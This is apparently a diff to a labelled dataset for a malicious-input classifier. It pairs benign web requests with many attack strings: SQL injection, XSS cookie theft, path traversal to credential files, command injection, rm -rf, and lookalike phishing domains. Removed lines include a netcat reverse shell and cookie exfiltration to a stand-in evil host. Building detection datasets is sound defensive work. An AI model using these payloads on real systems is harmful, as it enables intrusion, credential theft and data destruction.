+    "text": "please load the account page",
+    "label": 0
+  },
+  {
+    "text": "https://example.com/home",
+    "label": 0
+  },
+  {
+    "text": "https://github.com/login",
+    "label": 0
+  },
+  {
+    "text": "https://google.com/search?q=notifications",
+    "label": 0
+  },
+  {
+    "text": "https://microsoft.com/products",
+    "label": 0
+  },
+  {
+    "text": "https://amazon.com/s/cart",
+    "label": 0
+  },
+  {
+    "text": "https://app.example.com/profile",
+    "label": 0
+  },
+  {
+    "text": "open my balance",
+    "label": 0
+  },
+  {
+    "text": "view products",
+    "label": 0
+  },
+  {
+    "text": "search shipping",
+    "label": 0
+  },
+  {
+    "text": "update dashboard information",
+    "label": 0
+  },
+  {
+    "text": "show recent report",
+    "label": 0
+  },
+  {
+    "text": "get document details",
+    "label": 0
+  },
+  {
+    "text": "check subscription status",
+    "label": 0
+  },
+  {
+    "text": "create a new billing",
+    "label": 0
+  },
+  {
+    "text": "download my preferences",
+    "label": 0
+  },
+  {
+    "text": "contact customer support about messages",
+    "label": 0
+  },
+  {
+    "text": "change my team",
+    "label": 0
+  },
+  {
+    "text": "list available calendar",
+    "label": 0
+  },
+  {
+    "text": "track my files",
+    "label": 0
+  },
+  {
+    "text": "please load the analytics page",
     "label": 0
   },
   {
@@ -124,63 +2004,31 @@
     "label": 1
   },
   {
-    "text": "admin' OR '1'='1",
+    "text": "' UNION SELECT email FROM users --",
     "label": 1
   },
   {
-    "text": "' OR 1=1#",
+    "text": "SELECT * FROM orders",
     "label": 1
   },
   {
-    "text": "' OR 'x'='x",
+    "text": "DROP TABLE customers",
     "label": 1
   },
   {
-    "text": "UNION SELECT password FROM users",
+    "text": "DELETE FROM sessions WHERE id=5",
     "label": 1
   },
   {
-    "text": "UNION SELECT username,password FROM users",
+    "text": "INSERT INTO payments VALUES (6)",
     "label": 1
   },
   {
-    "text": "SELECT * FROM users",
+    "text": "<script>alert(7)</script>",
     "label": 1
   },
   {
-    "text": "SELECT password FROM accounts",
-    "label": 1
-  },
-  {
-    "text": "DROP TABLE users",
-    "label": 1
-  },
-  {
-    "text": "DELETE FROM users WHERE id=1",
-    "label": 1
-  },
-  {
-    "text": "INSERT INTO users VALUES",
-    "label": 1
-  },
-  {
-    "text": "<script>alert(1)</script>",
-    "label": 1
-  },
-  {
-    "text": "<script>alert(document.cookie)</script>",
-    "label": 1
-  },
-  {
-    "text": "<img src=x onerror=alert(1)>",
-    "label": 1
-  },
-  {
-    "text": "<img src=x onerror=confirm(1)>",
-    "label": 1
-  },
-  {
-    "text": "<iframe src=javascript:alert(1)>",
+    "text": "<img src=x onerror=alert(8)>",
     "label": 1
   },
   {
@@ -188,15 +2036,7 @@
     "label": 1
   },
   {
-    "text": "<svg onload=alert(1)>",
-    "label": 1
-  },
-  {
-    "text": "document.cookie",
-    "label": 1
-  },
-  {
-    "text": "eval(alert(1))",
+    "text": "<svg onload=fetch('/steal')>",
     "label": 1
   },
   {
@@ -204,15 +2044,11 @@
     "label": 1
   },
   {
-    "text": "../../../etc/passwd",
-    "label": 1
-  },
-  {
     "text": "..\\..\\windows\\system32",
     "label": 1
   },
   {
-    "text": "/etc/passwd",
+    "text": "/etc/shadow",
     "label": 1
   },
   {
@@ -220,179 +2056,1947 @@
     "label": 1
   },
   {
-    "text": "whoami",
+    "text": "whoami && id",
     "label": 1
   },
   {
-    "text": "wget http://example.test/file",
+    "text": "wget http://evil.example/home",
     "label": 1
   },
   {
-    "text": "curl http://example.test/file",
+    "text": "curl http://evil.example/login",
     "label": 1
   },
   {
-    "text": "rm -rf /tmp/test",
+    "text": "rm -rf /var/account",
     "label": 1
   },
   {
-    "text": "xp_cmdshell",
+    "text": "{1+1}",
     "label": 1
   },
   {
-    "text": "base64,ZXZpbA==",
+    "text": "https://githu2b.com/orders",
     "label": 1
   },
   {
-    "text": "view dashboard summary",
-    "label": 0
-  },
-  {
-    "text": "get order history",
-    "label": 0
-  },
-  {
-    "text": "update shipping address",
-    "label": 0
-  },
-  {
-    "text": "list recent transactions",
-    "label": 0
-  },
-  {
-    "text": "change password successfully",
-    "label": 0
-  },
-  {
-    "text": "logout current session",
-    "label": 0
-  },
-  {
-    "text": "fetch product catalog",
-    "label": 0
-  },
-  {
-    "text": "apply discount coupon",
-    "label": 0
-  },
-  {
-    "text": "add item to cart",
-    "label": 0
-  },
-  {
-    "text": "checkout order",
-    "label": 0
-  },
-  {
-    "text": "view invoice pdf",
-    "label": 0
-  },
-  {
-    "text": "contact support team",
-    "label": 0
-  },
-  {
-    "text": "subscribe newsletter",
-    "label": 0
-  },
-  {
-    "text": "rate this product",
-    "label": 0
-  },
-  {
-    "text": "leave a review comment",
-    "label": 0
-  },
-  {
-    "text": "track my package",
-    "label": 0
-  },
-  {
-    "text": "filter products by price",
-    "label": 0
-  },
-  {
-    "text": "sort results by rating",
-    "label": 0
-  },
-  {
-    "text": "open settings page",
-    "label": 0
-  },
-  {
-    "text": "enable two factor authentication",
-    "label": 0
-  },
-  {
-    "text": "' UNION SELECT username,password FROM users--",
+    "text": "https://paypa1.com/profile",
     "label": 1
   },
   {
-    "text": "../../../../windows/system32/config/sam",
+    "text": "admin' OR 4=4 --",
     "label": 1
   },
   {
-    "text": "; DROP TABLE orders;--",
+    "text": "' UNION SELECT * FROM users --",
     "label": 1
   },
   {
-    "text": "<svg/onload=alert(document.cookie)>",
+    "text": "SELECT * FROM credentials",
     "label": 1
   },
   {
-    "text": "admin'/**/OR/**/1=1#",
+    "text": "DROP TABLE users",
     "label": 1
   },
   {
-    "text": "eval(base64_decode([cmd]))",
+    "text": "DELETE FROM accounts WHERE id=8",
     "label": 1
   },
   {
-    "text": "../../../etc/shadow",
+    "text": "INSERT INTO orders VALUES (9)",
     "label": 1
   },
   {
-    "text": "1' AND SLEEP(5)--",
+    "text": "<script>alert(1)</script>",
     "label": 1
   },
   {
-    "text": "cmd=cat /etc/passwd",
+    "text": "<img src=x onerror=alert(2)>",
     "label": 1
   },
   {
-    "text": "<script>fetch(\"http://evil.com?c=\"+document.cookie)</script>",
+    "text": "javascript:alert(document.cookie)",
     "label": 1
   },
   {
-    "text": "' OR 'a'='a",
+    "text": "<svg onload=fetch('/steal')>",
     "label": 1
   },
   {
-    "text": "exec xp_cmdshell(\"whoami\")",
+    "text": "../../etc/passwd",
     "label": 1
   },
   {
-    "text": "{{7*7}}",
+    "text": "..\\..\\windows\\system32",
     "label": 1
   },
   {
-    "text": "../../../boot.ini",
+    "text": "/etc/shadow",
     "label": 1
   },
   {
-    "text": "nc -e /bin/sh attacker.com 4444",
+    "text": "cmd=whoami",
     "label": 1
   },
   {
-    "text": "wget http://malicious.site/shell.php",
+    "text": "whoami && id",
     "label": 1
   },
   {
-    "text": "user'--",
+    "text": "wget http://evil.example/settings",
     "label": 1
   },
   {
-    "text": "select load_file(0x2f6574632f706173737764)",
+    "text": "curl http://evil.example/help",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/dashboard",
+    "label": 1
+  },
+  {
+    "text": "{4+4}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/search",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/checkout",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 7=7 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT password FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM sessions",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE payments",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM profiles WHERE id=2",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO credentials VALUES (3)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(4)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(5)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/billing",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/docs",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/users",
+    "label": 1
+  },
+  {
+    "text": "{7+7}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/login",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/account",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 1=1 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT username,password FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM accounts",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE orders",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM customers WHERE id=5",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO sessions VALUES (6)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(7)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(8)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/products",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/orders",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/profile",
+    "label": 1
+  },
+  {
+    "text": "{1+1}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/help",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/dashboard",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 4=4 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT token FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM profiles",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE credentials",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM users WHERE id=8",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO accounts VALUES (9)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(2)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/api/v1/items",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/search",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/checkout",
+    "label": 1
+  },
+  {
+    "text": "{4+4}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/docs",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/users",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 7=7 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT id FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM customers",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE sessions",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM payments WHERE id=2",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO profiles VALUES (3)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(4)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(5)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/home",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/login",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/account",
+    "label": 1
+  },
+  {
+    "text": "{7+7}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/orders",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/profile",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 1=1 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT name FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM users",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE accounts",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM orders WHERE id=5",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO customers VALUES (6)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(7)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(8)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/settings",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/help",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/dashboard",
+    "label": 1
+  },
+  {
+    "text": "{1+1}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/search",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/checkout",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 4=4 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT secret FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM payments",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE profiles",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM credentials WHERE id=8",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO users VALUES (9)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(2)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/billing",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/docs",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/users",
+    "label": 1
+  },
+  {
+    "text": "{4+4}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/login",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/account",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 7=7 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT email FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM orders",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE customers",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM sessions WHERE id=2",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO payments VALUES (3)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(4)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(5)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/products",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/orders",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/profile",
+    "label": 1
+  },
+  {
+    "text": "{7+7}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/help",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/dashboard",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 1=1 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT * FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM credentials",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE users",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM accounts WHERE id=5",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO orders VALUES (6)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(7)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(8)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/api/v1/items",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/search",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/checkout",
+    "label": 1
+  },
+  {
+    "text": "{1+1}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/docs",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/users",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 4=4 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT password FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM sessions",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE payments",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM profiles WHERE id=8",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO credentials VALUES (9)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(2)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/home",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/login",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/account",
+    "label": 1
+  },
+  {
+    "text": "{4+4}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/orders",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/profile",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 7=7 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT username,password FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM accounts",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE orders",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM customers WHERE id=2",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO sessions VALUES (3)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(4)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(5)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/settings",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/help",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/dashboard",
+    "label": 1
+  },
+  {
+    "text": "{7+7}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/search",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/checkout",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 1=1 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT token FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM profiles",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE credentials",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM users WHERE id=5",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO accounts VALUES (6)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(7)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(8)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/billing",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/docs",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/users",
+    "label": 1
+  },
+  {
+    "text": "{1+1}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/login",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/account",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 4=4 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT id FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM customers",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE sessions",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM payments WHERE id=8",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO profiles VALUES (9)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(2)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/products",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/orders",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/profile",
+    "label": 1
+  },
+  {
+    "text": "{4+4}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/help",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/dashboard",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 7=7 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT name FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM users",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE accounts",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM orders WHERE id=2",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO customers VALUES (3)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(4)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(5)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/api/v1/items",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/search",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/checkout",
+    "label": 1
+  },
+  {
+    "text": "{7+7}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/docs",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/users",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 1=1 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT secret FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM payments",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE profiles",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM credentials WHERE id=5",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO users VALUES (6)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(7)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(8)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/home",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/login",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/account",
+    "label": 1
+  },
+  {
+    "text": "{1+1}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/orders",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/profile",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 4=4 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT email FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM orders",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE customers",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM sessions WHERE id=8",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO payments VALUES (9)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(2)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/settings",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/help",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/dashboard",
+    "label": 1
+  },
+  {
+    "text": "{4+4}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/search",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/checkout",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 7=7 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT * FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM credentials",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE users",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM accounts WHERE id=2",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO orders VALUES (3)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(4)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(5)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
